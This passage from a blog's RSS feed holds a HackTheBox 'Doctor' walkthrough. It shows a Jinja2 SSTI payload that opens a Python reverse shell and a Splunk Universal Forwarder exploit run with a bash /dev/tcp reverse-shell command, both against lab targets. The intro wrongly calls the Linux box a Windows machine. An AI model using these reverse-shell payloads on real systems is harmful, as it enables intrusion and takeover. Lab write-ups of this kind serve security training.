<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Doctor</title>
      <link>https://fahmifj.github.io/hackthebox/doctor/</link>
      <pubDate>Sat, 06 Feb 2021 12:23:30 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/doctor/</guid>
      <description>Seven times seven is equal to SSTI</description>
      <content:encoded><![CDATA[<p>Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I&rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user&rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Server Side Template Injection</li>
<li>Splunk UF Exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>
<p>Nmap</p>
</li>
<li>
<p>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p>
</li>
<li>
<p>Tplmap - <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
</li>
<li>
<p>SSTI Cheatsheet - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#</a></p>
</li>
<li>
<p>PySplunkWhisperer2 - <a href="https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py">https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py</a></p>
</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.3»
</span></span><span class="line"><span class="cl">$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-doctor <span class="s1">&#39;10.10.10.209&#39;</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.209
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http     Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: POST OPTIONS HEAD GET
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Doctor
</span></span><span class="line"><span class="cl">8089/tcp open  ssl/http Splunkd httpd
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
</span></span><span class="line"><span class="cl"><span class="p">|</span>_/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Splunkd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: splunkd
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>SplunkCommonCA/organizationName<span class="o">=</span>Splunk/stateOrProvinceName<span class="o">=</span>CA/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-09-06T15:57:27
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2023-09-06T15:57:27
</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   db23 4e5c 546d <span class="m">8895</span> 0f5f 8f42 5e90 <span class="m">6787</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page shows a kind of health service website called &ldquo;Doctor&rdquo; in the title.</p>
<p><div class="img-container"><img src="imgs/image-20210509010426119.png" alt="image-20210509010426119"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>URL brute force with <code>gobuster</code> didn&rsquo;t find any interesting results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.209/images/]
</span></span><span class="line"><span class="cl">/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.10.209/js/]
</span></span><span class="line"><span class="cl">/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.10.209/css/]
</span></span><span class="line"><span class="cl">/contact.html         (Status: 200) [Size: 19848]
</span></span><span class="line"><span class="cl">/blog.html            (Status: 200) [Size: 19848]
</span></span><span class="line"><span class="cl">/about.html           (Status: 200) [Size: 19848]
</span></span><span class="line"><span class="cl">/index.html           (Status: 200) [Size: 19848]
</span></span><span class="line"><span class="cl">/services.html        (Status: 200) [Size: 19848]
</span></span><span class="line"><span class="cl">/fonts                (Status: 301) [Size: 312] [--&gt; http://10.10.10.209/fonts/]
</span></span><span class="line"><span class="cl">/departments.html     (Status: 200) [Size: 19848]
</span></span><span class="line"><span class="cl">/server-status        (Status: 403) [Size: 277]
</span></span><span class="line"><span class="cl">/index.html           (Status: 200) [Size: 19848]
</span></span></code></pre></div><h3 id="tcp-80---doctorshtb">TCP 80 - doctors.htb</h3>
<p>Because adding a machine name with &ldquo;.htb&rdquo; as TLD to <code>/etc/hosts</code> file has become my habit (i.e <code>doctor.htb</code>), so at first, on the homepage, I didn&rsquo;t notice that there is an additional &ldquo;s&rdquo; on <code>info@doctors.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210509011106327.png" alt="image-20210509011106327"  /></div>
</p>
<p>Once I added <code>doctors.htb</code> to my <code>/etc/hosts</code> file, I refreshed the page with that hostname, and it presented a different web application.</p>
<p><div class="img-container"><img src="imgs/image-20210509011333267.png" alt="image-20210509011333267"  /></div>
</p>
<p>In the page source, I found a comment telling that the archive feature is still in beta testing, so I&rsquo;ll note this.</p>
<p><div class="img-container"><img src="imgs/image-20210509013716799.png" alt="image-20210509013716799"  /></div>
</p>
<h4 id="gobuster-1">Gobuster</h4>
<p>I ran another gobuster scan, but it seems I&rsquo;ll just register an account this time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/logout               (Status: 302) [Size: 217] [--&gt; http://doctors.htb/home]
</span></span><span class="line"><span class="cl">/register             (Status: 200) [Size: 4493]
</span></span><span class="line"><span class="cl">/login                (Status: 200) [Size: 4204]
</span></span><span class="line"><span class="cl">/home                 (Status: 302) [Size: 245] [--&gt; http://doctors.htb/login?next=%2Fhome]
</span></span><span class="line"><span class="cl">/archive              (Status: 200) [Size: 101]
</span></span><span class="line"><span class="cl">/account              (Status: 302) [Size: 251] [--&gt; http://doctors.htb/login?next=%2Faccount]
</span></span><span class="line"><span class="cl">/server-status        (Status: 403) [Size: 276]
</span></span></code></pre></div><p>My account is only available for 20 minutes.</p>
<p><div class="img-container"><img src="imgs/image-20210509014205880.png" alt="image-20210509014205880"  /></div>
</p>
<p>The &ldquo;1&rdquo; icon was actually a page number with URL that points to <code>http://doctors.htb/home?page=1</code>.</p>
<h3 id="tcp-8089--splunk-universal-forwarder">TCP 8089  —  Splunk Universal Forwarder</h3>
<p>I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.</p>
<p>At the top, I can see the Splunk version.</p>
<p><div class="img-container"><img src="imgs/image-20210509014443695.png" alt="image-20210509014443695"  /></div>
</p>
<h4 id="finding-vulnerability">Finding vulnerability</h4>
<p>Knowing the version, I did a quick search on Google to look for available exploits, and I came across <code>hackbooktriks.xyz</code></p>
<ul>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence">https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence</a></li>
</ul>
<p>The original research was published in here:</p>
<ul>
<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
</ul>
<p>But it requires credentials. I&rsquo;ll just add this to my to do list.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-web">Shell as web</h3>
<h4 id="sql-injection---failed">SQL Injection - Failed</h4>
<p>I can create a post message on <code>doctors.htb</code> by visiting <a href="http://doctors.htb/post/new">http://doctors.htb/post/new</a>. Below is the example request</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/post/new</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">doctors.htb</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://doctors.htb/post/new</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">title=test&amp;content=test&amp;submit=Post
</span></span></code></pre></div><p>I fed the request to <code>SQLMap</code>, but it doesn&rsquo;t seem injectable.</p>
<p>And then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows <code>doctors.htb</code> uses Flask as its backend.</p>
<p><div class="img-container"><img src="imgs/136d4a7725d44c5a9de3b53bd18bfdb9.png" alt="136d4a7725d44c5a9de3b53bd18bfdb9"  /></div>
</p>
<h4 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h4>
<p>Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.</p>
<blockquote>
<p>PwnFunction’s video on <a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">SSTI</a> was very informative.</p>
<p>TryHackMe also has a room called “<a href="https://tryhackme.com/room/flask">Flask</a>” that contains an example of SSTI attack on Flask. I have completed that room, and  the note is available on my <a href="https://github.com/fahmifj/TryHackMe-notes/tree/main/flask">GitHub</a>.</p>
</blockquote>
<p>Here is the methodology to detect SSTI (taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology">here</a>):</p>
<p><div class="img-container"><img src="imgs/serverside.png" alt="SSTI cheatsheet workflow"  /></div>
</p>
<p><code>http://doctors.htb/home?page=1</code> is the first attack vector to target. I used a tool called <code>Tplmap.py</code> to automatically detect SSTI, but no luck.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.3»
</span></span><span class="line"><span class="cl">$ python tplmap.py -u <span class="s1">&#39;http://doctors.htb/home?page=iamf&#39;</span>                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;page&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Smarty plugin is testing rendering with tag <span class="s1">&#39;*&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Smarty plugin is testing blind injection
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Ruby plugin is testing blind injection
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Ejs plugin is testing rendering with tag <span class="s1">&#39;*&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Ejs plugin is testing blind injection
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">][</span>checks<span class="o">]</span> Tested parameters appear to be not injectable.
</span></span></code></pre></div><p>The second attack vector is <code>http://doctors.htb/post/new</code>, which allows me to create a post message. It consists of two input vectors: the title and the content/message.</p>
<p><div class="img-container"><img src="imgs/image-20210509023608857.png" alt="image-20210509023608857"  /></div>
</p>
<p>I copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn&rsquo;t return the expected result.</p>
<p><div class="img-container"><img src="imgs/image-20210509024048415.png" alt="image-20210509024048415"  /></div>
</p>
<p>It also returns nothing when I submit the payloads on the title.</p>
<p>After hours trying to figure out why it didn&rsquo;t work, I noticed that the <code>/archive</code> page occasionally returns an error when I put some payload that has the percentage symbol, like <code>{% payload %}</code>, on the content/message section.</p>
<p><div class="img-container"><img src="imgs/image-20210509024504730.png" alt="image-20210509024504730"  /></div>
</p>
<p>Or sometimes it only has the post title that can be seen only from the page source.</p>
<p><div class="img-container"><img src="imgs/image-20210509024707956.png" alt="image-20210509024707956"  /></div>
</p>
<p>So from there, I submitted the basic payload on the title.</p>
<img src="imgs/image-20210509025456790.png" alt="image-20210509025456790" style="zoom:50%;" />
<p>Right after inserting the payload, I checked the page source of <code>/archive</code>, and I found the expected result of the SSTI payload there.</p>
<p><div class="img-container"><img src="imgs/image-20210509025854497.png" alt="image-20210509025854497"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my <code>nc</code> listener listening on the port I specified.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="s2">&#34;warning&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">%</span><span class="p">}{{</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">_module</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&#34;</span><span class="s2">10.10.14.4</span><span class="se">\&#34;</span><span class="s2">,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\&#34;</span><span class="s2">/bin/sh</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">-i</span><span class="se">\&#34;</span><span class="s2">]);&#39;&#34;</span><span class="p">)}}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
</span></span></code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «doctor» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>            
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.209<span class="o">]</span> <span class="m">5628</span>
</span></span><span class="line"><span class="cl">/bin/sh: 0: can’t access tty<span class="p">;</span> job control turned off
</span></span><span class="line"><span class="cl">$ which python
</span></span><span class="line"><span class="cl">$ which python3
</span></span><span class="line"><span class="cl">/usr/bin/python3
</span></span><span class="line"><span class="cl">$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">web@doctor:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-shaun">Shell as shaun</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>These are the users who have login shells.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">web@doctor:~$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">web:x:1001:1001:,,,:/home/web:/bin/bash
</span></span><span class="line"><span class="cl">shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
</span></span><span class="line"><span class="cl">splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
</span></span></code></pre></div><p>Because <code>web</code> is a member of the <code>adm</code> group, I can read the log files at <code>/var/log</code>. While enumerating with <code>find</code> command, I caught an Apache2 log called &ldquo;backup&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">web@doctor:~$ find / -type f -readable -group adm 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/var/log/kern.log.3.gz
</span></span><span class="line"><span class="cl">/var/log/auth.log
</span></span><span class="line"><span class="cl">/var/log/syslog
</span></span><span class="line"><span class="cl">/var/log/ufw.log.2.gz
</span></span><span class="line"><span class="cl">/var/log/dmesg.2.gz
</span></span><span class="line"><span class="cl">/var/log/auth.log.1
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">/var/log/apache2/backup
</span></span></code></pre></div><p>Searching string &ldquo;pass&rdquo; on the backup log reveals this line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">web@doctor:/var/log/apache2$ cat backup <span class="p">|</span> grep pass
</span></span><span class="line"><span class="cl">10.10.14.4 - - <span class="o">[</span>05/Sep/2020:11:17:34 +2000<span class="o">]</span> <span class="s2">&#34;POST /reset_password?email=Guitar123&#34;</span> <span class="m">500</span> <span class="m">453</span> <span class="s2">&#34;http://doctor.htb/reset_password&#34;</span>
</span></span></code></pre></div><p>It printed as <code>email=Guitar123</code>, but it doesn&rsquo;t look like an email to me.</p>
<h4 id="su---shaun">SU - shaun</h4>
<p>It turns out that <code>Guitar123</code> is shaun&rsquo;s password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">web@doctor:/var/log/apache2$ su shaun
</span></span><span class="line"><span class="cl">Password: Guitar123
</span></span><span class="line"><span class="cl">web@doctor:/var/log/apache2$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>shaun<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>shaun<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>shaun<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="exploiting-splunk-with-pysplunkwhisperer2">Exploiting Splunk with PySplunkWhisperer2</h4>
<p>I&rsquo;ll recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.</p>
<p>The researcher stated that the Splunk UF agent&rsquo;s username is always admin.</p>
<blockquote>
<p>Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a  Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 &hellip;</p>
</blockquote>
<p>But that&rsquo;s not the case on this machine, because I can use <code>shaun:Guitar123</code> to authenticate to the Splunk UF services on port 8089.</p>
<p>I tried <a href="https://github.com/cnotin/SplunkWhisperer2">this PoC</a> from GitHub using the bash reverse shell as payload,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.3»
</span></span><span class="line"><span class="cl">$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port <span class="m">8089</span> --username shaun --password Guitar123 --payload <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9001 0&gt;&amp;1&#39;&#34;</span> --lhost 10.10.14.3
</span></span><span class="line"><span class="cl">Running in remote mode <span class="o">(</span>Remote Code Execution<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> Authenticating...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Authenticated
</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> Creating malicious app bundle...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Created malicious app bundle in: /tmp/tmpkwnss3rw.tar
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Started HTTP server <span class="k">for</span> remote mode
</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> Installing app from: http://10.10.14.3:8181/
</span></span><span class="line"><span class="cl">10.10.10.209 - - <span class="o">[</span>03/Feb/2021 05:09:23<span class="o">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="m">200</span> -
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> App installed, your code should be running now!
</span></span></code></pre></div><p>and it worked smoothly.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «doctor» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.3<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.209<span class="o">]</span> <span class="m">48834</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1137<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@doctor:/# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div><p>I can grab the root flag.</p>
<p><div class="img-container"><img src="imgs/image-20210509042058603.png" alt="image-20210509042058603"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
